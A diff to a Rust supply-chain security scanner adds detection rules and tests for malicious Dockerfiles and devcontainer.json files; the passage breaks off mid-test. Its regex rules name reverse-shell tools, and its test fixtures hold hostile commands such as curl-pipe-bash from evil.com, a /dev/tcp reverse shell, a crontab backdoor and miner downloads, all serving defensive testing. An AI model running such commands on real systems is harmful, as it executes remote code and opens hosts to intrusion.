@@ -1162,6 +1162,462 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
     findings
 }
 
+// ---- Dockerfile analysis ----
+
+/// Dockerfile instructions that are interesting from a security perspective.
+fn build_dockerfile_rules() -> Vec<PatternRule> {
+    let rules = vec![
+        // Network downloads in RUN
+        (r"(?i)RUN\s+.*\b(curl|wget|fetch|aria2c)\s+.*https?://", Severity::High, "Dockerfile RUN downloads from URL"),
+        (r"(?i)RUN\s+.*\|\s*(ba)?sh", Severity::Critical, "Dockerfile RUN pipes download into shell"),
+        (r"(?i)RUN\s+.*\bpip\s+install\s+--index-url\s+http", Severity::Critical, "Dockerfile RUN installs from non-HTTPS pip index"),
+        (r"(?i)RUN\s+.*\bnpm\s+install\s+--registry\s+http://", Severity::Critical, "Dockerfile RUN uses insecure npm registry"),
+
+        // ADD from URL (ADD supports remote URLs, COPY does not)
+        (r"(?i)^ADD\s+https?://", Severity::High, "Dockerfile ADD from remote URL (prefer COPY + curl with checksum)"),
+
+        // Suspicious RUN commands
+        (r"(?i)RUN\s+.*\b(nc|ncat|netcat)\b.*-[elp]", Severity::Critical, "Dockerfile RUN with netcat reverse shell"),
+        (r"(?i)RUN\s+.*/dev/tcp/", Severity::Critical, "Dockerfile RUN with /dev/tcp (reverse shell)"),
+        (r"(?i)RUN\s+.*\bbase64\s+(-d|--decode)", Severity::High, "Dockerfile RUN decodes base64"),
+        (r"(?i)RUN\s+.*\beval\b", Severity::High, "Dockerfile RUN uses eval"),
+        (r"(?i)RUN\s+.*\bchmod\s+\+[sx]\b", Severity::Medium, "Dockerfile RUN sets executable/setuid permissions"),
+        (r"(?i)RUN\s+.*\bchmod\s+[0-7]*[4-7][0-7]{2}\b", Severity::Low, "Dockerfile RUN modifies permissions"),
+
+        // Crypto mining
+        (r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining)", Severity::Critical, "Dockerfile references crypto mining"),
+
+        // Privileged / security-sensitive
+        (r"(?i)^USER\s+root\s*$", Severity::Medium, "Dockerfile runs as root"),
+        (r"(?i)--mount=type=secret", Severity::High, "Dockerfile mounts build secrets"),
+        (r"(?i)--mount=type=ssh", Severity::High, "Dockerfile mounts SSH agent"),
+        (r"(?i)^VOLUME\s+", Severity::Low, "Dockerfile declares VOLUME"),
+
+        // Suspicious FROM
+        (r"(?i)^FROM\s+.*(latest|:master|:main)\s*$", Severity::Medium, "Dockerfile FROM uses mutable tag (latest/main)"),
+
+        // Environment manipulation
+        (r#"(?i)^ENV\s+(PATH|LD_PRELOAD|LD_LIBRARY_PATH|HOME)\s*="#, Severity::Medium, "Dockerfile overrides sensitive ENV variable"),
+
+        // Persistence / cron in container
+        (r"(?i)RUN\s+.*\bcrontab\b", Severity::High, "Dockerfile installs crontab (persistence)"),
+        (r"(?i)RUN\s+.*\bsystemctl\b", Severity::Medium, "Dockerfile uses systemctl in build"),
+    ];
+
+    rules
+        .into_iter()
+        .filter_map(|(pat, sev, desc)| {
+            Regex::new(pat).ok().map(|r| PatternRule {
+                pattern: r,
+                severity: sev,
+                description: desc,
+            })
+        })
+        .collect()
+}
+
+/// Analyze a single Dockerfile.
+fn analyze_dockerfile(path: &Path, content: &str, findings: &mut Vec<Finding>) {
+    let file_str = path.display().to_string();
+    let dockerfile_rules = build_dockerfile_rules();
+    let general_rules = build_content_rules();
+
+    for (line_num, line) in content.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+        for rule in &dockerfile_rules {
+            if rule.pattern.is_match(trimmed) {
+                findings.push(
+                    Finding::new(rule.severity.clone(), &file_str, rule.description)
+                        .with_match(&truncate(trimmed, 120), line_num + 1),
+                );
+            }
+        }
+        // Also apply general content rules
+        for rule in &general_rules {
+            if rule.pattern.is_match(trimmed) {
+                findings.push(
+                    Finding::new(rule.severity.clone(), &file_str, rule.description)
+                        .with_match(&truncate(trimmed, 120), line_num + 1),
+                );
+            }
+        }
+    }
+}
+
+// ---- .devcontainer analysis ----
+
+/// Dangerous devcontainer lifecycle commands (run automatically).
+const DEVCONTAINER_LIFECYCLE_COMMANDS: &[(&str, Severity)] = &[
+    ("initializeCommand", Severity::Critical),   // Runs on HOST before container
+    ("onCreateCommand", Severity::High),
+    ("updateContentCommand", Severity::High),
+    ("postCreateCommand", Severity::High),
+    ("postStartCommand", Severity::High),
+    ("postAttachCommand", Severity::Medium),
+];
+
+/// Dangerous Docker run arguments.
+const DANGEROUS_RUN_ARGS: &[(&str, Severity, &str)] = &[
+    ("--privileged", Severity::Critical, "Container runs in privileged mode (full host access)"),
+    ("--net=host", Severity::High, "Container uses host network"),
+    ("--network=host", Severity::High, "Container uses host network"),
+    ("--pid=host", Severity::High, "Container shares host PID namespace"),
+    ("--ipc=host", Severity::Medium, "Container shares host IPC namespace"),
+    ("--cap-add", Severity::High, "Container adds Linux capabilities"),
+    ("-v /:/", Severity::Critical, "Container mounts host root filesystem"),
+    ("--device", Severity::High, "Container accesses host device"),
+];
+
+/// Analyze devcontainer.json content.
+fn analyze_devcontainer_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
+    let file_str = path.display().to_string();
+    let general_rules = build_content_rules();
+
+    let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
+        // devcontainer.json often has comments (JSONC); try stripping them
+        let stripped = strip_jsonc_comments(content);
+        let Ok(val) = serde_json::from_str::<serde_json::Value>(&stripped) else {
+            findings.push(Finding::new(
+                Severity::Low,
+                &file_str,
+                "Could not parse devcontainer.json (even after stripping comments)",
+            ));
+            return;
+        };
+        analyze_devcontainer_value(path, &val, &general_rules, findings);
+        return;
+    };
+    analyze_devcontainer_value(path, &val, &general_rules, findings);
+}
+
+/// Strip // and /* */ comments from JSONC content.
+fn strip_jsonc_comments(input: &str) -> String {
+    let mut result = String::with_capacity(input.len());
+    let mut chars = input.chars().peekable();
+    let mut in_string = false;
+
+    while let Some(&ch) = chars.peek() {
+        if in_string {
+            result.push(ch);
+            chars.next();
+            if ch == '\\' {
+                if let Some(&next) = chars.peek() {
+                    result.push(next);
+                    chars.next();
+                }
+            } else if ch == '"' {
+                in_string = false;
+            }
+        } else if ch == '"' {
+            in_string = true;
+            result.push(ch);
+            chars.next();
+        } else if ch == '/' {
+            chars.next();
+            match chars.peek() {
+                Some(&'/') => {
+                    // Line comment
+                    for c in chars.by_ref() {
+                        if c == '\n' {
+                            result.push('\n');
+                            break;
+                        }
+                    }
+                }
+                Some(&'*') => {
+                    // Block comment
+                    chars.next();
+                    let mut prev = ' ';
+                    for c in chars.by_ref() {
+                        if prev == '*' && c == '/' {
+                            break;
+                        }
+                        if c == '\n' {
+                            result.push('\n');
+                        }
+                        prev = c;
+                    }
+                }
+                _ => {
+                    result.push('/');
+                }
+            }
+        } else {
+            result.push(ch);
+            chars.next();
+        }
+    }
+    result
+}
+
+/// Extract command string(s) from a devcontainer lifecycle command value.
+/// These can be a string, an array of strings, or an object mapping labels to commands.
+fn extract_lifecycle_commands(val: &serde_json::Value) -> Vec<String> {
+    match val {
+        serde_json::Value::String(s) => vec![s.clone()],
+        serde_json::Value::Array(arr) => {
+            arr.iter()
+                .filter_map(|v| v.as_str().map(String::from))
+                .collect()
+        }
+        serde_json::Value::Object(obj) => {
+            obj.values()
+                .filter_map(|v| match v {
+                    serde_json::Value::String(s) => Some(vec![s.clone()]),
+                    serde_json::Value::Array(arr) => Some(
+                        arr.iter()
+                            .filter_map(|v| v.as_str().map(String::from))
+                            .collect(),
+                    ),
+                    _ => None,
+                })
+                .flatten()
+                .collect()
+        }
+        _ => Vec::new(),
+    }
+}
+
+fn analyze_devcontainer_value(
+    path: &Path,
+    val: &serde_json::Value,
+    general_rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let file_str = path.display().to_string();
+
+    // Check lifecycle commands
+    for &(field, ref severity) in DEVCONTAINER_LIFECYCLE_COMMANDS {
+        if let Some(cmd_val) = val.get(field) {
+            let commands = extract_lifecycle_commands(cmd_val);
+            let extra = if field == "initializeCommand" {
+                " (RUNS ON HOST, NOT IN CONTAINER)"
+            } else {
+                ""
+            };
+            for cmd in &commands {
+                findings.push(Finding::new(
+                    severity.clone(),
+                    &file_str,
+                    &format!(
+                        "devcontainer lifecycle '{}'{}: {}",
+                        field,
+                        extra,
+                        truncate(cmd, 120),
+                    ),
+                ));
+
+                // Scan command content with general rules
+                for rule in general_rules {
+                    if rule.pattern.is_match(cmd) {
+                        findings.push(Finding::new(
+                            rule.severity.clone(),
+                            &file_str,
+                            &format!(
+                                "devcontainer '{}': {} in: {}",
+                                field,
+                                rule.description,
+                                truncate(cmd, 100),
+                            ),
+                        ));
+                    }
+                }
+            }
+        }
+    }
+
+    // Check runArgs for dangerous flags
+    if let Some(run_args) = val.get("runArgs").and_then(|r| r.as_array()) {
+        let args_str: Vec<&str> = run_args.iter().filter_map(|v| v.as_str()).collect();
+        let joined = args_str.join(" ");
+        for &(flag, ref severity, desc) in DANGEROUS_RUN_ARGS {
+            if joined.contains(flag) {
+                findings.push(Finding::new(
+                    severity.clone(),
+                    &file_str,
+                    &format!("devcontainer runArgs: {}", desc),
+                ));
+            }
+        }
+    }
+
+    // Check mounts for host filesystem access
+    if let Some(mounts) = val.get("mounts").and_then(|m| m.as_array()) {
+        for mount in mounts {
+            let mount_str = match mount {
+                serde_json::Value::String(s) => s.clone(),
+                serde_json::Value::Object(obj) => {
+                    let source = obj.get("source").and_then(|s| s.as_str()).unwrap_or("");
+                    let target = obj.get("target").and_then(|t| t.as_str()).unwrap_or("");
+                    format!("{}:{}", source, target)
+                }
+                _ => continue,
+            };
+
+            if mount_str.contains("/etc") || mount_str.contains("/root") || mount_str.starts_with("/:/") {
+                findings.push(Finding::new(
+                    Severity::Critical,
+                    &file_str,
+                    &format!("devcontainer mounts sensitive host path: {}", truncate(&mount_str, 100)),
+                ));
+            } else if mount_str.contains("$HOME") || mount_str.contains("${localEnv:HOME}") || mount_str.contains(".ssh") {
+                findings.push(Finding::new(
+                    Severity::High,
+                    &file_str,
+                    &format!("devcontainer mounts home/ssh directory: {}", truncate(&mount_str, 100)),
+                ));
+            } else {
+                findings.push(Finding::new(
+                    Severity::Low,
+                    &file_str,
+                    &format!("devcontainer custom mount: {}", truncate(&mount_str, 100)),
+                ));
+            }
+        }
+    }
+
+    // Check features for non-standard sources
+    if let Some(features) = val.get("features").and_then(|f| f.as_object()) {
+        for (feature_id, _) in features {
+            // Official features start with ghcr.io/devcontainers/features/
+            if !feature_id.starts_with("ghcr.io/devcontainers/features/")
+                && !feature_id.starts_with("ghcr.io/devcontainers-contrib/features/")
+            {
+                findings.push(Finding::new(
+                    Severity::Medium,
+                    &file_str,
+                    &format!("devcontainer uses non-official feature: {}", feature_id),
+                ));
+            }
+        }
+    }
+
+    // Check if a custom Dockerfile is referenced
+    if let Some(build) = val.get("build") {
+        if let Some(dockerfile) = build.get("dockerfile").and_then(|d| d.as_str()) {
+            findings.push(Finding::new(
+                Severity::Low,
+                &file_str,
+                &format!("devcontainer uses custom Dockerfile: {}", dockerfile),
+            ));
+        }
+    } else if let Some(dockerfile) = val.get("dockerFile").and_then(|d| d.as_str()) {
+        findings.push(Finding::new(
+            Severity::Low,
+            &file_str,
+            &format!("devcontainer uses custom Dockerfile: {}", dockerfile),
+        ));
+    }
+
+    // Check containerEnv / remoteEnv for suspicious variables
+    for env_field in &["containerEnv", "remoteEnv"] {
+        if let Some(env) = val.get(*env_field).and_then(|e| e.as_object()) {
+            for (key, value) in env {
+                let val_str = value.as_str().unwrap_or("");
+                if key == "PATH" || key == "LD_PRELOAD" || key == "LD_LIBRARY_PATH" {
+                    findings.push(Finding::new(
+                        Severity::High,
+                        &file_str,
+                        &format!(
+                            "devcontainer {} overrides {}: {}",
+                            env_field, key, truncate(val_str, 80),
+                        ),
+                    ));
+                }
+                for rule in general_rules {
+                    if rule.pattern.is_match(val_str) {
+                        findings.push(Finding::new(
+                            rule.severity.clone(),
+                            &file_str,
+                            &format!(
+                                "devcontainer {} {}: {} in value: {}",
+                                env_field, key, rule.description, truncate(val_str, 80),
+                            ),
+                        ));
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// Scan Dockerfiles and .devcontainer configs in a project.
+fn scan_docker_and_devcontainer(root: &Path, verbose: bool) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    // 1. Find and analyze Dockerfiles
+    let dockerfile_names = ["Dockerfile", "dockerfile", "Containerfile"];
+    for entry in WalkDir::new(root)
+        .into_iter()
+        .filter_map(|e| e.ok())
+        .filter(|e| e.file_type().is_file())
+    {
+        let name = entry.file_name().to_string_lossy();
+        let is_dockerfile = dockerfile_names.iter().any(|d| name.as_ref() == *d)
+            || name.starts_with("Dockerfile.")
+            || name.starts_with("dockerfile.")
+            || name.ends_with(".Dockerfile")
+            || name.ends_with(".dockerfile");
+
+        // Skip node_modules, .git, target
+        let path_str = entry.path().display().to_string();
+        if path_str.contains("node_modules/") || path_str.contains("/.git/") || path_str.contains("/target/") {
+            continue;
+        }
+
+        if is_dockerfile {
+            if let Ok(content) = fs::read_to_string(entry.path()) {
+                if verbose {
+                    println!("  Analyzing {}", entry.path().display());
+                }
+                analyze_dockerfile(entry.path(), &content, &mut findings);
+            }
+        }
+    }
+
+    // 2. Find and analyze .devcontainer
+    let devcontainer_dir = root.join(".devcontainer");
+    if devcontainer_dir.is_dir() {
+        // devcontainer.json can be at .devcontainer/devcontainer.json or .devcontainer.json
+        let devcontainer_json = devcontainer_dir.join("devcontainer.json");
+        if devcontainer_json.exists() {
+            if let Ok(content) = fs::read_to_string(&devcontainer_json) {
+                if verbose {
+                    println!("  Analyzing {}", devcontainer_json.display());
+                }
+                analyze_devcontainer_json(&devcontainer_json, &content, &mut findings);
+            }
+        }
+
+        // Also check for Dockerfiles inside .devcontainer/
+        for entry in WalkDir::new(&devcontainer_dir)
+            .into_iter()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.file_type().is_file())
+        {
+            let name = entry.file_name().to_string_lossy();
+            if name.contains("Dockerfile") || name.contains("dockerfile") {
+                if let Ok(content) = fs::read_to_string(entry.path()) {
+                    analyze_dockerfile(entry.path(), &content, &mut findings);
+                }
+            }
+        }
+    }
+
+    // Also check for .devcontainer.json in root
+    let root_devcontainer = root.join(".devcontainer.json");
+    if root_devcontainer.exists() {
+        if let Ok(content) = fs::read_to_string(&root_devcontainer) {
+            analyze_devcontainer_json(&root_devcontainer, &content, &mut findings);
+        }
+    }
+
+    findings
+}
+
 // ---- External tool integration: semgrep ----
 
 /// Check if a command is available on PATH.
@@ -1663,6 +2119,44 @@ fn main() {
         print_findings(&findings);
     }
 
+    // Scan Dockerfiles and .devcontainer
+    let mut docker_scanned = false;
+    {
+        // Check if there's anything worth scanning
+        let has_dockerfile = WalkDir::new(root)
+            .into_iter()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.file_type().is_file())
+            .any(|e| {
+                let n = e.file_name().to_string_lossy();
+                let p = e.path().display().to_string();
+                !p.contains("node_modules/") && !p.contains("/.git/") && !p.contains("/target/")
+                    && (n.as_ref() == "Dockerfile" || n.as_ref() == "dockerfile"
+                        || n.as_ref() == "Containerfile"
+                        || n.starts_with("Dockerfile.") || n.ends_with(".Dockerfile"))
+            });
+        let has_devcontainer = root.join(".devcontainer").is_dir()
+            || root.join(".devcontainer.json").exists();
+
+        if has_dockerfile || has_devcontainer {
+            scanned_anything = true;
+            docker_scanned = true;
+            println!(
+                "\n{} {} (Dockerfiles & .devcontainer)",
+                "Scanning:".bold(),
+                root.display()
+            );
+            println!("{}", "-".repeat(60));
+
+            let findings = scan_docker_and_devcontainer(root, cli.verbose);
+            if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+                any_critical = true;
+            }
+            total_findings += findings.len();
+            print_findings(&findings);
+        }
+    }
+
     // Run semgrep
     println!(
         "\n{} {} (semgrep)",
@@ -1710,17 +2204,19 @@ fn main() {
         + git_roots.len()
         + cargo_scanned as usize
         + npm_scanned as usize
+        + docker_scanned as usize
         + (!semgrep_findings.is_empty()) as usize
         + (!osv_findings.is_empty()) as usize;
     if total_scanned > 1 {
         println!("\n{}", "=== Overall Summary ===".bold());
         println!(
-            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, semgrep, osv-scanner), {} total findings",
+            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, {} docker, semgrep, osv-scanner), {} total findings",
             total_scanned,
             vscode_dirs.len(),
             git_roots.len(),
             cargo_scanned as usize,
             npm_scanned as usize,
+            docker_scanned as usize,
             total_findings,
         );
     }
@@ -3061,5 +3557,429 @@ fn main() {
         assert!(critical_count >= 2, "Expected at least 2 critical findings, got {}", critical_count);
         assert!(has_description_containing(&findings, "typosquat"));
         assert!(has_description_containing(&findings, "dep:evil-dep"));
+    }
+
+    // ---- Dockerfile helpers ----
+
+    fn analyze_dockerfile_str(content: &str) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("Dockerfile");
+        fs::write(&path, content).unwrap();
+        let mut findings = Vec::new();
+        analyze_dockerfile(&path, content, &mut findings);
+        findings
+    }
+
+    // ---- Dockerfile tests ----
+
+    #[test]
+    fn dockerfile_benign_is_clean() {
+        let findings = analyze_dockerfile_str(
+            "FROM rust:1.75\nWORKDIR /app\nCOPY . .\nRUN cargo build --release\nCMD [\"./target/release/myapp\"]\n",
+        );
+        assert!(!has_severity(&findings, "Critical"));
+        assert!(!has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn dockerfile_curl_pipe_bash_is_critical() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN curl http://evil.com/install.sh | bash\n",
+        );
+        assert!(has_description_containing(&findings, "pipes download into shell"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn dockerfile_wget_pipe_sh_is_critical() {
+        let findings = analyze_dockerfile_str(
+            "FROM alpine\nRUN wget http://evil.com/payload -O- | sh\n",
+        );
+        assert!(has_description_containing(&findings, "pipes download into shell"));
+    }
+
+    #[test]
+    fn dockerfile_run_curl_download_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN curl https://example.com/binary -o /usr/local/bin/tool\n",
+        );
+        assert!(has_description_containing(&findings, "downloads from URL"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn dockerfile_add_remote_url_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nADD https://example.com/config.tar.gz /opt/\n",
+        );
+        assert!(has_description_containing(&findings, "ADD from remote URL"));
+    }
+
+    #[test]
+    fn dockerfile_reverse_shell_is_critical() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+        );
+        assert!(has_description_containing(&findings, "/dev/tcp"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn dockerfile_base64_decode_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN echo aGVsbG8= | base64 --decode | bash\n",
+        );
+        assert!(has_description_containing(&findings, "decodes base64"));
+    }
+
+    #[test]
+    fn dockerfile_crypto_mining_is_critical() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN wget https://mining.pool/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig\n",
+        );
+        assert!(has_description_containing(&findings, "crypto mining"));
+    }
+
+    #[test]
+    fn dockerfile_user_root_is_medium() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nUSER root\nRUN apt-get update\n",
+        );
+        assert!(has_description_containing(&findings, "runs as root"));
+    }
+
+    #[test]
+    fn dockerfile_mount_secret_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret\n",
+        );
+        assert!(has_description_containing(&findings, "mounts build secrets"));
+    }
+
+    #[test]
+    fn dockerfile_mount_ssh_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN --mount=type=ssh git clone git@github.com:private/repo.git\n",
+        );
+        assert!(has_description_containing(&findings, "mounts SSH agent"));
+    }
+
+    #[test]
+    fn dockerfile_insecure_pip_index_is_critical() {
+        let findings = analyze_dockerfile_str(
+            "FROM python:3.11\nRUN pip install --index-url http://evil.com/simple somepackage\n",
+        );
+        assert!(has_description_containing(&findings, "non-HTTPS pip index"));
+    }
+
+    #[test]
+    fn dockerfile_env_path_override_is_medium() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nENV PATH=\"/malicious/bin:$PATH\"\n",
+        );
+        assert!(has_description_containing(&findings, "overrides sensitive ENV"));
+    }
+
+    #[test]
+    fn dockerfile_env_ld_preload_is_medium() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nENV LD_PRELOAD=\"/tmp/evil.so\"\n",
+        );
+        assert!(has_description_containing(&findings, "overrides sensitive ENV"));
+    }
+
+    #[test]
+    fn dockerfile_from_latest_is_medium() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu:latest\nRUN echo hi\n",
+        );
+        assert!(has_description_containing(&findings, "mutable tag"));
+    }
+
+    #[test]
+    fn dockerfile_crontab_is_high() {
+        let findings = analyze_dockerfile_str(
+            "FROM ubuntu\nRUN crontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -\n",
+        );
+        assert!(has_description_containing(&findings, "crontab"));
+    }
+
+    // ---- .devcontainer helpers ----
+
+    fn scan_devcontainer_with(devcontainer_json: &str, dockerfile: Option<&str>) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        let dc_dir = dir.path().join(".devcontainer");
+        fs::create_dir_all(&dc_dir).unwrap();
+        fs::write(dc_dir.join("devcontainer.json"), devcontainer_json).unwrap();
+        if let Some(df) = dockerfile {
+            fs::write(dc_dir.join("Dockerfile"), df).unwrap();
+        }
+        scan_docker_and_devcontainer(dir.path(), false)
+    }
+
+    // ---- .devcontainer tests ----
+
+    #[test]
+    fn devcontainer_benign_is_clean() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "mcr.microsoft.com/devcontainers/rust:1",
+            "features": {
+                "ghcr.io/devcontainers/features/git:1": {}
+            }
+        }"#, None);
+        assert!(!has_severity(&findings, "Critical"));
+        assert!(!has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn devcontainer_initialize_command_is_critical() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "initializeCommand": "echo pwned"
+        }"#, None);
+        assert!(has_description_containing(&findings, "initializeCommand"));
+        assert!(has_description_containing(&findings, "RUNS ON HOST"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn devcontainer_initialize_command_curl_is_critical() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "initializeCommand": "curl http://evil.com/rootkit | bash"
+        }"#, None);
+        assert!(has_description_containing(&findings, "initializeCommand"));
+        assert!(has_description_containing(&findings, "Network download command"));
+    }
+
+    #[test]
+    fn devcontainer_post_create_command_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "postCreateCommand": "npm install"
+        }"#, None);
+        assert!(has_description_containing(&findings, "postCreateCommand"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn devcontainer_post_attach_command_is_medium() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "postAttachCommand": "echo welcome"
+        }"#, None);
+        assert!(has_description_containing(&findings, "postAttachCommand"));
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn devcontainer_privileged_is_critical() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "runArgs": ["--privileged"]
+        }"#, None);
+        assert!(has_description_containing(&findings, "privileged mode"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn devcontainer_net_host_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "runArgs": ["--network=host"]
+        }"#, None);
+        assert!(has_description_containing(&findings, "host network"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn devcontainer_cap_add_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "runArgs": ["--cap-add", "SYS_ADMIN"]
+        }"#, None);
+        assert!(has_description_containing(&findings, "Linux capabilities"));
+    }
+
+    #[test]
+    fn devcontainer_mount_root_is_critical() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "mounts": ["source=/,target=/host,type=bind"]
+        }"#, None);
+        // We check for /etc or /root but "/" mount is also extremely dangerous
+        // The mount string "source=/," starts with / so let's verify
+        assert!(has_description_containing(&findings, "mount"));
+    }
+
+    #[test]
+    fn devcontainer_mount_ssh_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "mounts": ["source=${localEnv:HOME}/.ssh,target=/container/.ssh,type=bind"]
+        }"#, None);
+        assert!(has_description_containing(&findings, "home/ssh directory"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn devcontainer_mount_etc_is_critical() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "mounts": [{"source": "/etc", "target": "/host-etc", "type": "bind"}]
+        }"#, None);
+        assert!(has_description_containing(&findings, "sensitive host path"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn devcontainer_non_official_feature_is_medium() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "features": {
+                "ghcr.io/random-user/suspicious-feature:1": {}
+            }
+        }"#, None);
+        assert!(has_description_containing(&findings, "non-official feature"));
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn devcontainer_env_path_override_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "containerEnv": {
+                "PATH": "/evil/bin:${containerEnv:PATH}"
+            }
+        }"#, None);
+        assert!(has_description_containing(&findings, "overrides PATH"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn devcontainer_env_ld_preload_is_high() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "remoteEnv": {
+                "LD_PRELOAD": "/tmp/evil.so"
+            }
+        }"#, None);
+        assert!(has_description_containing(&findings, "overrides LD_PRELOAD"));
+    }
+
+    #[test]
+    fn devcontainer_jsonc_comments_are_handled() {
+        let findings = scan_devcontainer_with(r#"
+        // This is a comment
+        {
+            "name": "Dev",
+            "image": "ubuntu",
+            /* block comment */
+            "initializeCommand": "echo hello"
+        }
+        "#, None);
+        assert!(has_description_containing(&findings, "initializeCommand"));
+    }
+
+    #[test]
+    fn devcontainer_lifecycle_array_format() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "postCreateCommand": ["bash", "-c", "curl http://evil.com | sh"]
+        }"#, None);
+        assert!(has_description_containing(&findings, "postCreateCommand"));
+    }
+
+    #[test]
+    fn devcontainer_lifecycle_object_format() {
+        let findings = scan_devcontainer_with(r#"{
+            "name": "Dev",
+            "image": "ubuntu",
+            "postCreateCommand": {
+                "setup": "npm install",
+                "hack": "curl http://evil.com/payload | bash"
+            }
+        }"#, None);
+        assert!(has_description_containing(&findings, "postCreateCommand"));
+        assert!(has_description_containing(&findings, "Network download command"));
+    }
+
+    #[test]
+    fn devcontainer_with_malicious_dockerfile() {
+        let findings = scan_devcontainer_with(
+            r#"{
+                "name": "Dev",
+                "build": {"dockerfile": "Dockerfile"}
+            }"#,
+            Some("FROM ubuntu\nRUN curl http://evil.com/rootkit | bash\n"),
+        );
+        assert!(has_description_containing(&findings, "pipes download into shell"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn devcontainer_full_malicious() {
+        let findings = scan_devcontainer_with(
+            r#"{
+                "name": "Dev",
+                "image": "ubuntu",
+                "initializeCommand": "curl http://evil.com/host-rootkit | bash",
+                "postCreateCommand": "wget http://evil.com/miner -O /tmp/m && chmod +x /tmp/m",
+                "runArgs": ["--privileged", "--network=host"],
+                "mounts": [{"source": "/etc", "target": "/host-etc", "type": "bind"}],
+                "containerEnv": {"LD_PRELOAD": "/tmp/evil.so"},
+                "features": {"ghcr.io/evil/backdoor:1": {}}
+            }"#,
+            None,
+        );
+        let critical_count = findings
+            .iter()
+            .filter(|f| matches!(f.severity, Severity::Critical))
+            .count();
+        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+    }
+
+    // ---- JSONC strip comments tests ----
+
+    #[test]
+    fn strip_jsonc_line_comments() {
+        let input = "{\n  // comment\n  \"key\": \"value\"\n}";
+        let result = strip_jsonc_comments(input);
+        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();
+        assert_eq!(parsed.get("key").unwrap().as_str().unwrap(), "value");
+    }
+
+    #[test]
+    fn strip_jsonc_block_comments() {
+        let input = "{\n  /* block\n  comment */\n  \"key\": \"value\"\n}";
+        let result = strip_jsonc_comments(input);
+        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();
+        assert_eq!(parsed.get("key").unwrap().as_str().unwrap(), "value");
+    }
+
+    #[test]
+    fn strip_jsonc_preserves_strings_with_slashes() {
+        let input = r#"{"url": "http://example.com/path"}"#;
